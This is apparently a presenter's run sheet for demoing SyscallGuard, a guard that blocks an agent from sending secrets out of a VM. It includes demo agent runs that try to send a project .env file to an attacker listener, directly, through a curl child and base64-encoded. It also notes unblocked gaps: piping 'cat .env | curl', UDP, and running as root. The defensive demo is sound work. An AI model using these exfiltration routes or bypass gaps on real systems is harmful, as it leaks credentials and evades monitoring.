# SyscallGuard — demo run sheet

Six windows. Nothing typed live. Copy-paste only.

## Before anything
Host: `virsh -c qemu:///system start fed` (if not running)
VM:   `findmnt /home/inno/syscallguard-solo` — must show virtiofs.
      Empty dir = share not mounted yet, wait or:
      `sudo mount -t virtiofs solo /home/inno/syscallguard-solo`
VM:   `hostname -I` — must be 192.168.122.174
Host: `sudo firewall-cmd --zone=libvirt --list-ports` — 9999/tcp 9999/udp

## W1 — HOST — attacker (show this one to judges)
cd /home/zxan/projects/syscallguard-solo
python3 demo/attacker.py --port 9999

## W2 — HOST — dashboard
cd /home/zxan/projects/syscallguard-solo
python3 -m http.server 8000 --bind 127.0.0.1 -d dashboard/dist
Open http://127.0.0.1:8000/   (no query string)
Rebuild only if the bridge URL changed:
cd dashboard && unset SG_BRIDGE_URL && npm run build && cd ..

## W3 — VM — internal API
cd /home/inno/syscallguard-solo
python3 demo/internal_api.py --port 8080

## W4 — VM — pipeline (ONE command, guard and bridge together)
cd /home/inno/syscallguard-solo
sudo python3 -B guard/guard.py -p demo/solo-policy.toml --mode enforce | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
Wait for: listening on ws://0.0.0.0:8765
Dashboard indicators go green. READY row appears.

## W5 — VM — agent
cd /home/inno/syscallguard-solo

# allowed work only, nothing leaves
python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest --target 192.168.122.1:9999 --exfil none

# the block
python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest --target 192.168.122.1:9999 --exfil direct

# inheritance via curl child
python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest --target 192.168.122.1:9999 --exfil curl

# base64 — destination, not content
python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest --target 192.168.122.1:9999 --exfil b64

## W6 — VM — judge's terminal
Same cd. Hand them W5's commands.
DO NOT invite pipes (cat .env | curl) — known gap, not blocked.
UDP and preconnect are NOT blocked yet (hook C unmerged). Say so if asked.

## If it breaks
Dashboard grey      → check URL shown on page; curl -v telnet://192.168.122.174:8765 from host
Guard: unknown      → bridge unreachable, W4 not running or not --host 0.0.0.0
No TAG at all       → wrong directory. Must be syscallguard-solo, NOT syscallguard
BPF load failure    → exit 3, ERROR event. Kernel locked at 7.2.10-200.fc44, do not update
Everything dead     → backup video
Everything dead     →`virsh -c qemu:///system snapshot-revert fed m7-freeze`
                     `virsh -c qemu:///system start fed`
                     then W1-W5 from the top. Verified restorable 21 Oct: mount, IP .174, inode 760558 all came back.

## Never
- agent as root (bypasses the guard entirely, refuses anyway)
- bridge.py --fake on stage — that is synthetic data, fake tgids 4421/4422
- editing .env while the guard runs (inode changes, protection lapses)
